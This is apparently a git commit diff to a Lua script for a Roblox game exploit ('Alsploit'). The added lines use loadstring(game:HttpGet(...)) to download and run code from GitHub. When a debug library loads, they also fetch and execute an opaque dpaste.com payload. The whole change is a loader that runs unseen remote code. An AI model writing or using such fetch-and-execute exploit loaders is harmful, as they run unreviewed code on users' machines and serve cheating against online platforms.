39c8c51562bd31c579349e5482493b444abca93d
Liquid <iloveexploiting123@gmail.com>
2024-09-24 16:52:11 +0800

    Update AlsolaraNew.lua

--- AlsolaraNew.lua
+++ AlsolaraNew.lua
@@ -1,1 +1,8 @@
 -- Beta testing not done
+local debug = loadstring(game:HttpGet("https://raw.githubusercontent.com/zwar808/BetterUNC/refs/heads/main/lib/Debug.lua"))()
+local Drawing = loadstring(game:HttpGet("https://raw.githubusercontent.com/zwar808/BetterUNC/refs/heads/main/lib/Drawing.lua"))()
+local net = loadstring(game:HttpGet("https://raw.githubusercontent.com/zwar808/BetterUNC/refs/heads/main/lib/Net.lua"))()
+if debug then
+	loadstring(game:HttpGet("https://dpaste.com/3E3YZ2ZED.txt",true))()
+	print("[Debug] Operating: Alsploit_OLD")
+end
